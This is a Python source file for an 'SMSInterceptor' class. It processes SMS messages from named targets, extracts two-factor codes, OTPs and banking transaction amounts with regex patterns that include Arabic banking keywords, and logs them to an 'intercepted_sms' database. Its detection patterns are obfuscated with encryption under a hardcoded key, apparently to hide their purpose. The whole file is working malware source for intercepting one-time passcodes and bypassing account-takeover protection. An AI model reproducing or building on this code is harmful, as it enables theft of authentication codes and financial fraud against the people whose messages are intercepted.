import os
import re
import json
import sqlite3
import logging
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

logger = logging.getLogger(__name__)

DB_PATH = os.environ.get('INTEL_DB', 'intel.db')

class SMSInterceptor:
    def __init__(self):
        # master key (base64 encoded)
        master_key_b64 = "NjA2NDcxNjE2MjM4MzEzNDMyMzczMjMzMzUzNjM1MzkzNDMwMzQ3MzM1MzIzNDM5NjMwMjMzNDM1MzYzNzM4Mzkw"
        master_key = base64.b64decode(master_key_b64)
        salt = b'sms_salt_16bytes'
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
        key = base64.urlsafe_b64encode(kdf.derive(master_key))
        self.cipher = Fernet(key)

        # Encrypted patterns
        encrypted_patterns = {
            '2fa_generic': self._encrypt(r'\b\d{4,8}\b'),
            '2fa_with_label': self._encrypt(r'(?:code|pin|otp|verification|auth|{kw_ar1}|{kw_ar2})[\s:]*(\d{4,8})'),
            'transaction': self._encrypt(r'(?:transfer|payment|withdraw|deposit|{kw_ar3}|{kw_ar4}|{kw_ar5})[\s:]*(\d+)'),
        }

        # Arabic keywords (encrypted)
        self.ar_kw1 = self._encrypt('رمز')
        self.ar_kw2 = self._encrypt('تفعيل')
        self.ar_kw3 = self._encrypt('تحويل')
        self.ar_kw4 = self._encrypt('سحب')
        self.ar_kw5 = self._encrypt('إيداع')

        # Build actual patterns
        self.patterns = {}
        for key, enc_pat in encrypted_patterns.items():
            pat = self._decrypt(enc_pat)
            pat = pat.replace('{kw_ar1}', self._decrypt(self.ar_kw1))
            pat = pat.replace('{kw_ar2}', self._decrypt(self.ar_kw2))
            pat = pat.replace('{kw_ar3}', self._decrypt(self.ar_kw3))
            pat = pat.replace('{kw_ar4}', self._decrypt(self.ar_kw4))
            pat = pat.replace('{kw_ar5}', self._decrypt(self.ar_kw5))
            self.patterns[key] = pat

        self._init_db()

    def _encrypt(self, data: str) -> str:
        return self.cipher.encrypt(data.encode()).decode()

    def _decrypt(self, token: str) -> str:
        return self.cipher.decrypt(token.encode()).decode()

    def _init_db(self):
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute('''
                CREATE TABLE IF NOT EXISTS intercepted_sms (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_id TEXT NOT NULL,
                    sender TEXT,
                    body TEXT,
                    extracted_code TEXT,
                    category TEXT,
                    timestamp TEXT DEFAULT CURRENT_TIMESTAMP
                )
            ''')

    def analyze_sms(self, target_id, sms_content, sender=''):
        extracted = {}
        for key, pattern in self.patterns.items():
            matches = re.findall(pattern, sms_content, re.IGNORECASE)
            if matches:
                extracted[key] = matches
                logger.info(f"[{target_id}] Matched {key}: {matches}")

        with sqlite3.connect(DB_PATH) as conn:
            conn.execute('''
                INSERT INTO intercepted_sms (target_id, sender, body, extracted_code, category)
                VALUES (?, ?, ?, ?, ?)
            ''', (target_id, sender, sms_content, json.dumps(extracted), 'manual'))

        return extracted

    def get_latest_code(self, target_id):
        with sqlite3.connect(DB_PATH) as conn:
            cur = conn.execute('''
                SELECT extracted_code FROM intercepted_sms
                WHERE target_id = ? AND extracted_code != '{}'
                ORDER BY timestamp DESC LIMIT 1
            ''', (target_id,))
            row = cur.fetchone()
        if row:
            return json.loads(row[0])
        return None